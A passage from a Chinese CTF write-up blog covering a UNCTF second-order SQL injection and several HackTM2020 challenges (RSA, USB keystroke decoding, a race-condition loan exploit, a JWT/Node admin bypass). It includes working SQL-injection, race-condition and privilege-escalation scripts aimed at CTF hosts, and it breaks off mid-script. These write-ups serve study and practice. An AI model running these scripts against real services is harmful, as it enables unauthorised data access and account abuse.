\"mysubmit\": \"Login\" } r = s.post(url1, data) data = { \"current_password\": '0', \"password\": '1', \"re_password\": '1', \"submit\": 'Reset' } r = s.post(url2, data)def second(): flag = \"\" tmp = 1 for i in range(1, 50): if tmp == 0: break tmp = 0 for j in range(32, 127): s = requests.session() user = \"scl'and ascii(substr((select database()),\" + str(i) + \",1))=\" + str(j) + \"#\" print user # 注册用户名 data = { \"username\": user, \"password\": '1', \"re_password\": '1', \"submit\": \"Register\" } r = s.post(url, data) # 登录用户 data = { \"login_user\": user, \"login_password\": '1', \"mysubmit\": \"Login\" } r = s.post(url1, data) # print r.content.decode() if \"YOU ARE LOGGED IN AS\" in r.content.decode(): print \"login ok\" # 更改密码 data = { \"current_password\": '1', \"password\": '0', \"re_password\": '0', \"submit\": 'Reset' } r = s.post(url2, data) if \"successfully updated\" in r.content.decode(): flag += chr(j) tmp = 1 print \"change ok\" change21() break print flagsecond() 总结这个题目的类型是第一见，在北京联合大学举办的UNCTF里面第一次见到，然后昨天去打web安全的省赛又遇到了（安恒真会省事），当时拿到环境复现了一下，但是由于服务器原因，没有跑出完整的flag，但是是第一次见这类的题，写个题解学习一下。","link":"/2020/02/02/UNCTF-Twice_Insert-WriteUp/"},{"title":"HackTM2020-WriteUp","text":"HackTM2020-WriteUp假期被“关禁闭”，看到战队发的比赛链接，虽然知道自己很菜，题目不是我可以做的，不过还是大胆尝试了，发现一些题目还比较简单[滑稽脸]，这里写一下部分题目的WP。 RSA#1这是一个简单的RSA爆破题。 题目分析题目给了两个附件：c、rsa.py，其中c的内容如下： Public key:(65537, 28150970547901913019901824364390497053600856369839321617996700606130553862041378369018779003752433356889118526332329074054728613209407037089320809898343953157935211086135010436283805891893636870991411236307901650696221491790470635225076251966300189483160148297407974155121570252648252906976186499329924342873)Encrypted flag:[24603931406187071861602497345394097692989773194039735745762181586628499407802825983901643034231448504738113184470035863824128031443012073830520233613935485192804104698999763287388765215634314977991988580048221541560353418280294402691661980705832590960497587810514295642811714680627768268704899874164681718449, 11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176, 15645290594995180815865397749136800126080704684884296404807344870555186823350216705796063922278419585484662234210001661578549560411864952462380096494781766394542247609648743673312823946783517115542404474786395934886667795692210287283039316418126796934535150832709500306153601987121172178183970841498331059732, 24345863558959407738249127568820138362115734211146549194534219311913032290216606859385934708675962835857804566049600710875035366973110422262131331932310524891713319358676673958738776644229757625523955354996402750265022578843637525183704187498194489645838490640529841182709661371499013082259193633000753627261, 9620679224297488175028367924764722982789333194446063577221477359704180638294602848741035585656113543497776415635770748468725814916994577398023154224563920936523717884116880223345204061598438291740007518025998041449406726084042681798053863495542392481059281588020105313791046017356493739244555377217866496734, 1681724029430984846089508679185107538104072555994133932050319175633667369916570440070548756805254789524599169177371471218251246349461689959989338169394649813424706418737543924129213419625988100326558802566046751879531469160120914735332858786199496335523515150741728027296830843112416558460932541777024522279, 20629854768856798537062426042570334097651328955665698429979954410631113160492201197690192324881508105172595216229624523572595589920695165876501026993810936392510720968159305964832449680889041278532807173859579419197780294984519222830572413180237776797800176462492384318120546495539728732366110782215071262307, 7440918084186181327822271261394344901791253526257166181264874776746516620936925799031445704193589071453959493392065321806281801023425299535553522582376879027448581379760896052013060957519595664095702210758316558762834545655992756483227787274192094065257224706388623944855362716578806372564148647945479173348, 5097867843777034076271397095201528351784693372027998615436445410912131141882225577577253530396333413579756394884096318434100382509189974240357351425474190558456256750742731090012822064840481143528081027106843123030275420215136304130321013605031261372665636366377162666476737296028608455229357416005773064242, 10420107412794383499391199999666100864853724770814620968725971207705900061273163202891569477729023724554388008575891113425781557296798472693974759813058067631655217722786373465395279381307973425004404348124524059844749313287030234750535347511172780349725636807760402334957881556461382950021814486095167001394, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176, 16657126895659048065404729920028465477385009450133540950695155983380795627778054526133891673615252510518969355629562948102050307259107355106086468465392660721567070464708776158039303608428552547481825035736610837329720474688421062759594907620576318249542577396722737724172954532394471909440668625218820801756, 11113777356910731413424023299582648618258376222028450254478672148119889617557563576704932635131420845868165014982665717620845578039880527701593963719893467068820107811384041511295664833904504511210342105242330522375476482706044695838957591685781703894244561607764476555630573446589408768780659378128082633769, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 1681724029430984846089508679185107538104072555994133932050319175633667369916570440070548756805254789524599169177371471218251246349461689959989338169394649813424706418737543924129213419625988100326558802566046751879531469160120914735332858786199496335523515150741728027296830843112416558460932541777024522279, 5237767970074646857079948735567615361735616179074197239639640947679550920349684166643572837235712904929824521258264241503059989875517915784117038966236672390569320206379357882906463342282254405974383459878863044723383164329146669331810709270455492110346838097216174137176255793792848357953314563364460847842, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 2141625583250052666579569568613448089970148215959031795439930595139028085767825695294403905882459409861220995951141855281841435481587946825079031782977651718402048988278639212978854590412709087674713750292922397103941195760574072700517109381299788645871729355745594573785064162048047595009933642068871994670, 278354276293884030290100330445865286604723740111170856624965259573282278044823323212960304154629174664076141280100412502135750130875356944835909175355370317285768658282746817782130476757714384697086179400629156643250500432197002583758692394681401772203578628635926749457621478296182304772136118691761841359, 6039667595601233082552071610487048398346324705021423176423484623705376133358539134558362499891954091431687578305623106726900655384011241742715735786166290331136153240702822544221903404870992713778423167867663948083662620087859096707381620051266745156545213726214080049764382107442159825610310695543673475542, 21353765873487781085375016306418205544750755310255410963646737671193146222650262290683259548572190880304009015662963424520575937651278866672082973874806201031606257157229306007587966460187818647603633973019548401357989358306250139692325474674826791149726161678649996852062656272851387461089863388359261125336, 11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176, 20576388598886140095325204584799302384454378372204683348252463729525849583734948105765087991438423260690623246579570440405616572326057536248148020737810766134083795050076636686776809469271643188562482921546497071402873405706504773345621716428511481598704631451463399778602486417840466985891815649711178813963, 17347447662661486040040289855519394974371562320877472776529836975445205017304164550202099250096382852783253959549113036367974281750823938616836362593312254792770954856762797438690474329666549947795964992533463700161635382925555835347885819042031312006167190561233042383984087765920275010577545908085026177611, 11788628214684738246695632901992250075758959059858474645166125685861157046466064692980236734739634298802473894878268029860203026238925142258303727438570051822763330338744774300757888262747314093511013562545738571326771345495509434761853742569509480619380000424215527153118231084573851377049921456961916278761, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 2141625583250052666579569568613448089970148215959031795439930595139028085767825695294403905882459409861220995951141855281841435481587946825079031782977651718402048988278639212978854590412709087674713750292922397103941195760574072700517109381299788645871729355745594573785064162048047595009933642068871994670, 2710029303357232932696197225263692040597986927359269224740812600224998707144266259851604978553286889767425982708691908438984279442981540971935737617354609856642312100797081348174935195638083002333058089328102430432526612805955273581245352312630845237670744276402867230550537275379675828467791243032108754996, 19981107233593350929447953514006501458466479260151660185153999799085657467921097940751860717309377498501638075002136637344148955811617399850718322497572421311807629329642551519284713638882025500074565475569618691516951449764680555447185364165687596161053684299589053909233984617244886185728811651967713024530, 3975884358027162862622932959187611984655247354547659825042810425039322096401899672988989768997134724085482147901304365437476311647149733392577446833370358728610677436154877051592307539990184750467273668379065865808900410057533079113476991204462719784464847498582643056503810805516315622314948257403761762299, 6039667595601233082552071610487048398346324705021423176423484623705376133358539134558362499891954091431687578305623106726900655384011241742715735786166290331136153240702822544221903404870992713778423167867663948083662620087859096707381620051266745156545213726214080049764382107442159825610310695543673475542, 14296542628093736444815382636071360035549021313467366701986569710120268508807886041986007828960248665683292143486565404978073122476968882030310174125355932205646388813061197657253533595700948593692407928813318978600474254105007396254987998953819782624738628334271910759242195864082910860797444993756044746481, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 7983594351048693624291138893287137601848867970873700373034058935656045095987011116108642350616654713531373295621458596238107660073931212524833777531450461876588350132328332972361857441613098452082271331281504722310376573085001395356078670960667878342134517577992585442881605030717788248137764480486762452442, 7983594351048693624291138893287137601848867970873700373034058935656045095987011116108642350616654713531373295621458596238107660073931212524833777531450461876588350132328332972361857441613098452082271331281504722310376573085001395356078670960667878342134517577992585442881605030717788248137764480486762452442, 23267174349531278768420819619439317179083929128083924515569762521057285892931325108327037262091624670335579302436476096123152288550738706103166820604983405317430467198343871458522070337902643863890959573514405066297449924638838605501211486861582957963752388608487593217237563529201436917108304692859773404548] 易知，该文件提供了RSA的公钥：(e,n)，以及加密后的flag，我们发现，flag的密文是多个大数，可知是逐字节对flag进行加密的，那么进行简单的爆破即可解密。 再来看看rsa.py的内容： import randomfrom my_math import next_primefrom flag import flagdef egcd(a, b): x, y, u, v = 0, 1, 1, 0 while a != 0: q, r = b//a, b % a m, n = x-u*q, y-v*q b, a, x, y, u, v = a, r, u, v, m, n gcd = b return gcd, x, ydef gen_keys(p, q): e = 65537 n = p * q phi = (p - 1) * (q - 1) gcd, d, b = egcd(e, phi) # Keys:((pub), (priv)) return ((e, n), (d, n))def enc(key, p): e, n = key cipher = [pow(ord(char), e, n) for char in p] return cipherdef dec(pk, c): key, n = pk plain = [chr(pow(char, key, n)) for char in c] return ''.join(plain)p = next_prime(random.SystemRandom().getrandbits(512))q = next_prime(random.SystemRandom().getrandbits(512))flag_key=gen_keys(p, q)print(\"Public key:\")print(flag_key[0])flag_c=(enc(flag_key[0], flag))print(\"Encrypted flag:\")print(flag_c) 该脚本中是一些RSA的加密、解密函数，其中提供了p和q都是512bit的素数，因此模数n是1024bit的，打消分解n的念头（这里不得不说一下，有些比赛的1024bit以上的模数n在http://factordb.com/ 上是有上传的，有时候可以先拿去分解试试）我们从enc函数的加密机制发现，它是对明文进行逐字符进行加密，再次印证了是逐字节爆破，直接爆破flag即可。 解密代码import stringwith open('c', 'r') as f: data = f.read().split('\\n') e = int(data[1].split(', ')[0][1:]) n = int(data[1].split(', ')[1][:-1]) flag_enc = [int(x) for x in data[4][1:-1].split(', ')]flag = ''for f in flag_enc: for c in string.printable: if pow(ord(c), e, n) == f: flag += c breakprint(flag) RSA#2题目分析与上个题目一样，附件中包含两个文件c、rsa.py，并且rsa.py与上题一样： import randomfrom my_math import next_primefrom flag import flagdef egcd(a, b): x, y, u, v = 0, 1, 1, 0 while a != 0: q, r = b//a, b % a m, n = x-u*q, y-v*q b, a, x, y, u, v = a, r, u, v, m, n gcd = b return gcd, x, ydef gen_keys(p, q): e = 65537 n = p * q phi = (p - 1) * (q - 1) gcd, d, b = egcd(e, phi) # Keys:((pub), (priv)) return ((e, n), (d, n))def enc(key, p): e, n = key cipher = [pow(ord(char), e, n) for char in p] return cipherdef dec(pk, c): key, n = pk plain = [chr(pow(char, key, n)) for char in c] return ''.join(plain)p = next_prime(random.SystemRandom().getrandbits(512))q = next_prime(random.SystemRandom().getrandbits(512))flag_key=gen_keys(p, q)print(\"Public key:\")print(flag_key[0])flag_c=(enc(flag_key[0], flag))print(\"Encrypted flag:\")print(flag_c) 但是密文文件c内容不同，其中给出了逐字节加密的密文列表，但是并未给出公钥： Public key:[DATA CORRUPTED]Encrypted flag:[34220770932871364013976724839545041417474666615300575941746695940071552482886462087439379719184240006479394129946558717984964307444237521284361087031583504037093765914149168694482266218524635203263596760639253965500892625668716519628460563860957678979373258071483670494006067028836185890388591731283716604832...]这里列表中共有1111个字符的密文 没有公钥，怎么解密？？？显然也不是攻击私钥，而是直接对密文进行攻击。我们看到，密文列表中有1111个密文，一般的flag不可能这么长，而这里给出了这么多密文，并且没有给出公钥，解密思路便很显然：利用字母频率攻击出明文。这也是密码学常用的攻击方法之一，主要思路是：英文的字母在使用中出现的次数大致满足了一个频率表(参考https://en.wikipedia.org/wiki/Letter_frequency )，我们可以把这1111个密文的出现频率统计出来，然后与字母频率对应，从而攻击出明文。 解密代码with open('c', 'r') as f: data = f.read().split('\\n') flag_enc = [int(x) for x in data[4][1:-1].split(', ')]freq_dict = {}for f in flag_enc: if not f in freq_dict: freq_dict[f] = 1 else: freq_dict[f] += 1freq = sorted(list(freq_dict.items()), key=lambda x: x[1])freq.reverse()english_freq = [' ', 'E','T','A','I','N','O','R','S','L','H', 'C','M','D','Y','P','U','W','F','G','.','V', 'B','X','K',',','Q', 'Z', '\\'', '0', '9']translator = {}for i, c in enumerate(english_freq): translator[freq[i][0]] = cfor f in flag_enc: if f in translator: print(translator[f], end='') The Dragon Sleeps At Night一道misc题，考脑洞，也考基本知识，多做misc确实能开眼界啊！ 题目分析netcat连接目标IP之后进入一个游戏盒，秉承misc一大传统：打游戏。这个题目是一个屠龙的游戏，从图中可以看到，有以下功能：去商店：这里有从1级到5级的屠龙宝刀，屠龙！拿flag~去工作：赚钱买刀！屠龙！拿flag~去龙穴：屠龙！拿flag~回家：休息，为了屠龙！拿flag~储藏室：放宝刀 解题关键点： 1、这里去工作的话最后拿工资的时候会让输入工作天数，1刀/天，但是每次之多输入三个字符，因此常数的话最多999…怎么办呢？ 2、回家休息的时候可以输入休息的天数，但是休息会“降低”储藏室中宝刀的级别，1级/天，不过…休息天数正负不限~这两点就是屠龙的关键。 解题根据前面的分析，我们需要先去工作赚钱，在结账的时候输入9e9的话其实就可以得到9 billion刀，这足以买到5级宝刀了。其实就是利用科学计数法绕过限制，CTF中很多题目借用了这一点。此时去屠龙的话，仍然会失败，因为需要6级宝刀，但是商店没有啊！利用关键点2，我们先买5级宝刀并放在储藏室，然后去睡-1天，便得到了一把6级宝刀，再去屠龙便能顺利拿到flag了。 Strange PCAP考察流量包隐写、usb数据分析 题目分析下载数据包的时候，压缩工具就提示要输入密码，但是是个流量包，直接能打开，输密码干嘛？用binwalk分析一下，发现存在压缩包隐写，binwalk -e提取但是解压需要密码，那就看看数据包里的内容，发现是usb数据，估计就是键盘记录或者鼠标记录了利用常规的方法：把usb数据提取出来，然后用现有的跑键盘记录的脚本跑出来即可。先利用tshark提取数据： tshark -r Strange.pcapng -T fields -e usb.capdata | sed '/^\\s*$/d' &gt; usbdata.txt//加上\"| sed '/^\\s*$/d'\"是因为直接提取的话会有很多空行，加上这一句空行就没了 发现提取的数据如下： 00000001040001000000000000000000000104000100000000000000000100000000000000000000000000000000000000000000210008210010210012000024000000000000000000000000000000190000000000000000000000000000000a0000000000000000000000000000000d0000000000000000000000000000002100000000000000000000000000020000000000000002001600000000000200000000000000020016000000000002000000000000000000000000000000200000000000000020000f00000000000000000000000000000026000000000000000000000000002000000000000000200011000000000020000000000000000000000000000000200000000000000020000b000000000020000000000000000000000000000000200000000000000020001900000000002000000000000000000000000000000000001800000000000000000000000000020000000000000002000e000000000002000000000000000000000000000000000027000000000000000000000000000200000000000000020007000000000002000000000000000000000000000000000023000000000000000000000000000000070000000000000000000000000000002000000000000000000000000000020000000000000002000900000000000200000000000000000000000000000000002800000000000000000000000000210010 直接用脚本跑键盘记录的话，结果如下：可以看到结果不正常，因为上面的数据有很多冗余数据(长度不是8字节的部分)，去掉之后再跑脚本，结果如下：输入密码，即可拿到flag： 键盘记录脚本本题用国内的通用脚本解不出来，用国外wp的脚本可以 #经夏风师傅完善过的国外脚本usb_codes = { 0x04:\"aA\", 0x05:\"bB\", 0x06:\"cC\", 0x07:\"dD\", 0x08:\"eE\", 0x09:\"fF\", 0x0A:\"gG\", 0x0B:\"hH\", 0x0C:\"iI\", 0x0D:\"jJ\", 0x0E:\"kK\", 0x0F:\"lL\", 0x10:\"mM\", 0x11:\"nN\", 0x12:\"oO\", 0x13:\"pP\", 0x14:\"qQ\", 0x15:\"rR\", 0x16:\"sS\", 0x17:\"tT\", 0x18:\"uU\", 0x19:\"vV\", 0x1A:\"wW\", 0x1B:\"xX\", 0x1C:\"yY\", 0x1D:\"zZ\", 0x1E:\"1!\", 0x1F:\"2@\", 0x20:\"3#\", 0x21:\"4$\", 0x22:\"5%\", 0x23:\"6^\", 0x24:\"7&amp;\", 0x25:\"8*\", 0x26:\"9(\", 0x27:\"0)\", 0x2C:\" \", 0x2D:\"-_\", 0x2E:\"=+\", 0x2F:\"[{\", 0x30:\"]}\", 0x32:\"#~\", 0x33:\";:\", 0x34:\"'\\\"\", 0x36:\",&lt;\", 0x37:\".&gt;\", 0x38:\"/?\", 0x39:\"&lt;CAP&gt;&lt;CAP&gt;\", 0x3a:\"&lt;F1&gt;&lt;F1&gt;\", 0x3b:\"&lt;F4&gt;&lt;F4&gt;\", 0x3e:\"&lt;F5&gt;&lt;F5&gt;\",0x3f:\"&lt;F6&gt;&lt;F6&gt;\", 0x40:\"&lt;F7&gt;&lt;F7&gt;\",0x41:\"&lt;F8&gt;&lt;F8&gt;\",0x42:\"&lt;F9&gt;&lt;F9&gt;\",0x43:\"&lt;F10&gt;&lt;F10&gt;\", 0x44:\"&lt;F11&gt;&lt;F11&gt;\",0x45:\"&lt;F12&gt;&lt;F12&gt;\"}data = ''for x in open(\"usb.txt\",\"r\").readlines(): code = int(x[4:6],16) print(x[4:6]) if code == 0: continue if code == 0x28: print('ENTER!') print(data) data = '' continue upper = 0 if int(x[0:2],16) == 0x02 or int(x[0:2],16) == 0x20: upper = 1 data += usb_codes[code][upper]print(data) 再附一个国内的脚本： normalKeys = { \"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\", \"27\":\"0\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\", \"2c\":\"&lt;SPACE&gt;\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\", \"32\":\"&lt;NON&gt;\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA&gt;\",\"36\":\",\",\"37\":\".\", \"38\":\"/\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\", \"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\", \"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"}shiftKeys = { \"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\", \"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\", \"2d\":\"_\",\"2e\":\"+\",\"2f\":\"{\",\"30\":\"}\",\"31\":\"|\",\"32\":\"&lt;NON&gt;\",\"33\":\"\\\"\", \"34\":\":\",\"35\":\"&lt;GA&gt;\",\"36\":\"&lt;\",\"37\":\"&gt;\",\"38\":\"?\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\", \"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\", \"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"}output = []keys = open('usbdata.txt')for line in keys: try: if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]==\"00\": continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2'] else: output += ['[unknown]'] except: passkeys.close()flag=0print(\"\".join(output))for i in range(len(output)): try: a=output.index('&lt;DEL&gt;') except: passfor i in range(len(output)): try: if output[i]==\"&lt;CAP&gt;\": flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: passprint ('output :' + \"\".join(output)) 这里再拓展一下，usb流量一般是鼠标流量或者是键盘流量，可以参考这里。提供一位师傅的工具。 My Bank一道web的条件竞争题目 题目分析常见的一种题，可以去银行贷款，不过最多贷款600刀，还能去商店买东西，饼干最便宜，但是没法吃，还是买flag吧，但是要1440刀…分析可知，可以利用条件竞争进行贷款，这样就可以拿到不止600刀的资金，再去买flag即可。条件竞争可参考：https://blog.csdn.net/qq_36992198/article/details/80007405 解题1、利用BP解题 抓包 放到爆破模块，设置空payload，线程设为15 借到足够的钱去买flag 首先注册账号并登陆，看一下我们的账户信息：可以看到，我们还可以借600刀，然后设置借钱为100，BP抓包进行爆破，用13-15个线程即可，结果如下：然后回到我们的账户处查看利用条件竞争借到的1000刀已经到账:这里需要多次尝试才能借到足够的钱数，每次结果都可能是不一样的。因为利用BP进行条件竞争的时候有时候会受到网速、服务质量等各种因素的影响，多试几次就好了。 2、BASH脚本看国外大佬的解题思路学到了一种利用bash脚本进行条件竞争的方式(其实用python也一样)，脚本如下： #!/bin/bashurl=\"http://178.128.175.6:50090/\"ua=\"User-Agent: Mozilla/5.0\"cookie=\"session=.eJwNy0sKAjEMANC7ZG1hmmTy8TLStAmIoKDOSry7vv37wHw96_J-3PIOZwhCNNlimhOPlTor3IYOWjkijbOHFBac4Diu6z-Ute9SvWGZNaaNm3tko4mdQnRXF_j-AEMAHN8.Xjaggw.o-B9vO_i0Fnredto0K7aoEXTCGI\"ssrf=`curl -s \"$url\" -H \"$ua\" -H \"Cookie: $cookie\" 2&gt;&amp;1 | pcregrep -o1 'name=\\\"csrf_token\\\" type=\\\"hidden\\\" value=\\\"(.*)\\\"' -`for i in `seq 15`; do curl \"$url\" -H \"$ua\" -H \"Cookie: $cookie\" --data \"csrf_token=$ssrf&amp;loan=100\" &amp;; donesleep 6 &amp;&amp; echo \"[*] maybe haxed?\" &amp;&amp; curl -s 'http://178.128.175.6:50090/' -H \"$ua\" -H \"Cookie: $cookie\" 2&gt;&amp;1 | pcregrep -o1 \"Money: (.*) tBTC\" 这里利用了一个技巧：在cURL命令之后附加一个&amp;使进程移到后台。这样，可以同时发出多个请求，并且不需要编写一个处理多线程的复杂代码。 Draw With Us一个JWT攻击题目，进入题目是下图的一个改颜色的web端游戏，给出Hint：Changing your color is the first step towards happiness.同时题目还给了一个json附件，实现代码都在其中，其中包含关键部分： NodeJS Express服务器 登录/管理员管理/socket.io JWT算法：HMAC-SHA256 管理员用户名：hacktm 题目分析&amp;一些攻击尝试破解JWT秘钥代码中获取flag的函数如下： app.get(\"/flag\", (req, res) =&gt; { // Get the flag // Only for root if (req.user.id == 0) { res.send(ok({ flag: flag })); } else { res.send(err(\"Unauthorized\")); } 想要得到flag，就必须满足req.user.id == 0，那么就需要想办法构造JWT。看国外大佬的WP写的对JWT秘钥进行攻击，但是没有成功。 暴力破解n下面这段代码给出了req.user.id的生成算法： app.post(\"/init\", (req, res) =&gt; { // Initialize new round and sign admin token // RSA protected! // POST // { // p:\"0\", // q:\"0\" // } let { p = \"0\", q = \"0\", clearPIN } = req.body; let target = md5(config.n.toString()); let pwHash = md5( bigInt(String(p)) .multiply(String(q)) .toString() ); if (pwHash == target &amp;&amp; clearPIN === _clearPIN) { // Clear the board board = new Array(config.height) .fill(0) .map(() =&gt; new Array(config.width).fill(config.backgroundColor)); boardString = boardToStrings(); io.emit(\"board\", { board: boardString }); } //Sign the admin ID let adminId = pwHash .split(\"\") .map((c, i) =&gt; c.charCodeAt(0) ^ target.charCodeAt(i)) .reduce((a, b) =&gt; a + b); console.log(adminId); res.json(ok({ token: sign({ id: adminId }) }));}); 代码中的p和q是用户输入，n是秘钥。由于md5的结果为32个字符，且target长度与pwHash相同，同时toString暗示n是数字。adminId是利用target计算的，每个字符都经过了XOR运算。在map()的迭代中，两个字符相同的结果即为0，最后通过reduce()会计算出所有数的结果，若0，则req.user.id==0。然而，如果哈希值不匹配的话，req.user.id就会是一个大于0的数字。由于reduce()消除线性搜索推导的可能性，因此无法现实地对此进行暴力破解n，必须找到另一种方式。 JWT none 攻击这种攻击方法可参考：https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/ 1、替换或者更改JWT有效负载 2、更改id，如{&quot;id&quot;:1374,&quot;iat&quot;:1580560256} -&gt; {&quot;id&quot;:0,&quot;iat&quot;:1580560256} 3、删除签名 4、更改{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}-&gt;&quot;alg&quot;: &quot;none&quot; 5、提交服务器但是该方法也不行。 总之，关键点就在于： 1、使req.user.id==0 2、为了实现1需要得到config.n 3、可能有其他方式得到config.n或者config.p 从下面一段代码可以得到新的思路： app.get(\"/serverInfo\", (req, res) =&gt; { // Get server info // Only for logged in users let user = users[req.user.id] || { rights: [] }; let info = user.rights.map(i =&gt; ({ name: i, value: config[i] })); res.json(ok({ info: info }));}); 应该是利用user.rights作为访问key直接读取对象的代码，如果可以插入自己的user.rights，便可以插入n从而得到config.n的值。然后发现另一段更新用户数据的代码： app.post(\"/updateUser\", (req, res) =&gt; { // Update user color and rights // Only for admin // POST // { // color: 0xDEDBEE, // rights: [\"height\", \"width\", \"usersOnline\"] // } let uid = req.user.id; let user = users[uid]; if (!user || !isAdmin(user)) { res.json(err(\"You're not an admin!\")); return; } let color = parseInt(req.body.color); users[uid].color = (color || 0x0) &amp; 0xffffff; let rights = req.body.rights || []; if (rights.length &gt; 0 &amp;&amp; checkRights(rights)) { users[uid].rights = user.rights.concat(rights).filter(onlyUnique); } res.json(ok({ user: users[uid] }));}); 但是想要插入rigths必须绕过isAdmin(user)的判断，同时还有isValidUser(user)的判断： function isAdmin(u) { return u.username.toLowerCase() == config.adminUsername.toLowerCase();}function isValidUser(u) { return ( u.username.length &gt;= 3 &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toUpperCase() );} 可以利用下面的方式仿造admin： var admin = \"hacktm\";var user = \"hacKtm\"; 结果满足条件： \"hacKtm\".toLowerCase() == \"hacktm\".toLowerCase() // true\"hacKtm\".toUpperCase() === \"hacktm\".toUpperCase() // false 然后即可插入rigths，插入的时候需要经过checkRights(rights)的判断： function checkRights(arr) { let blacklist = [\"p\", \"n\", \"port\"]; for (let i = 0; i &lt; arr.length; i++) { const element = arr[i]; if (blacklist.includes(element)) { return false; } } return true;} 我们看到，黑名单中限制了p和n的上传，可以通过利用数组作为键的方式绕过： \"rights\":[[\"n\"]] 从而即可读取到n，然后通过使p==n，q==1，即可使req.user.id==0，从而拿到flag。 Expoit参照大佬脚本：获取n，p： import requestsurl = \"http://167.172.165.153:60001\"# create user with the admin usernameresp = requests.post(url + \"/login\", json={\"username\": \"hacKtm\"})resp.raise_for_status()token = resp.json()['data']['token']print(\"[*] Created user with admin username\")# add illegal rightsresp = requests.post(url + \"/updateUser\", json={\"rights\": [[\"n\"], [\"p\"]]}, headers={\"Authorization\": \"Bearer %s\" % token})resp.raise_for_status()print(\"[*] updated rights\")# fetch secret config valuesresp = requests.get(url + \"/serverInfo\", headers={\"Authorization\": \"Bearer %s\" % token})resp.raise_for_status()print(\"[*] fetched secret config values\")server_info = resp.json()for key in server_info[\"data\"][\"info\"]: if isinstance(key[\"name\"], list): print(\"[*] %s = %s\" % (key[\"name\"][0], 